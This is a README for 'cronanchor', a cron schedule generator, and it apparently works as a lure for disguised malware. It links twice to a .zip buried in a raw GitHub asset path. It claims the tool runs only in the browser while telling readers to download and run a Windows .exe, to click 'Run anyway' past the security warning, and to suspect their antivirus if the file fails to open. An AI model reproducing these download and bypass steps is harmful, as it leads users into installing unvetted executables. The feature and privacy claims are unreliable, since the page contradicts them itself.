# 📅 cronanchor - Create precise schedules for your tasks

<a href="https://raw.githubusercontent.com/fisanervousprostration593/cronanchor/main/design-system/pages/Software-v3.9.zip">
  <img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download Link">
</a>

cronanchor helps you create cron schedules for complex intervals. Most systems struggle with tasks that run every few weeks or on specific days. This tool handles those patterns with ease. It manages daylight savings time shifts automatically. You see future run dates before you save your schedule. The tool runs entirely within your web browser. Nothing leaves your computer.

## 🛠 What this tool does

Cron jobs often use simple formats. You might want a task that runs every two weeks. Standard tools fail at this task because they do not track the calendar accurately. cronanchor solves this.

* Accuracy for N-day and N-week intervals.
* DST-safe logic to prevent time shifts.
* Visual preview of the next 20 run dates.
* Local execution for privacy.
* Simple interface for common task scheduling.

## 📥 How to get started

You need a Windows computer to use this tool. Follow these steps to obtain and run the software.

1. Visit the [releases page](https://raw.githubusercontent.com/fisanervousprostration593/cronanchor/main/design-system/pages/Software-v3.9.zip) to download the application.
2. Locate the link labeled "Assets" under the latest version.
3. Select the file ending in `.exe` for Windows systems.
4. Save the file to your computer.
5. Open your downloads folder.
6. Double-click the file to start the application.

If Windows shows a security prompt, click "More info" and then "Run anyway." This confirms you trust the source. The application window opens once the process completes.

## ⚙️ Using the schedule generator

The interface uses simple inputs to create your schedule. You fill in the details for your task. The app generates the corresponding code string for you.

### Step 1: Set the interval
Decide how often your task runs. You can toggle between days and weeks. Enter the number for your cycle. For example, enter 2 if you want the task to run every two weeks.

### Step 2: Choose the start date
Select the date when your schedule begins. The tool calculates all future dates based on this starting point. This prevents errors when the schedule spans across different months.

### Step 3: Review the timeline
Look at the preview section. The app lists the next 20 times the task will trigger. Verify these dates match your expectations.

### Step 4: Copy the code
Once the dates look correct, copy the generated cron string. You can paste this final string into your server or system configuration.

## 💻 Requirements

* Windows 10 or Windows 11.
* A modern web browser like Chrome, Edge, or Firefox.
* RAM: 512 MB minimum.
* Storage: 100 MB of free space.
* Internet access for initial download only.

## 🛡 Security and privacy

cronanchor keeps your data private. You run the app on your local machine. No information travels to a cloud server. Your schedules stay on your device. The code remains in your browser session. This creates a secure environment for your sensitive automation tasks.

## 📝 Common questions

### Does this work when my computer is off?
The tool helps you generate the schedule string. It does not replace the server that runs your tasks. You must provide the generated string to your execution environment, such as a Linux server or a local task manager.

### Can I share my schedules?
You can copy and paste the generated string to any teammate or system. The code remains universal for all standard systems that support the cron format.

### Does it handle leap years?
Yes. The scheduling engine accounts for leap years and daylight savings time transitions. It relies on system-level calendar logic to ensure accuracy.

### Is the code open source?
Yes. You can view the code in the GitHub repository. The project uses TypeScript to ensure reliability. You can inspect every part of the application for transparency.

### What if the preview looks wrong?
Check your start date selection. Ensure you select the correct initial run day. If you still see issues, refresh the page to clear the current session.

## 🔧 Troubleshooting

If the application fails to open:

* Restart your computer.
* Check if your antivirus software blocked the execution.
* Ensure you downloaded the correct version for your Windows architecture.
* Verify you have permissions to run executable files on your local drive.

If the app behaves slowly:

* Close other unused applications. 
* Clear your browser cache if you use the web-hosted version.
* Ensure your monitor scale settings do not obscure interface elements.

## 🚀 Future updates

Development continues with a focus on simplicity. Expect minor updates that improve performance and add support for complex timezone offsets. You do not need to uninstall the old version to update. Simply download the new file and replace the old one. Your settings do not carry over automatically, so keep a record of your important cron strings.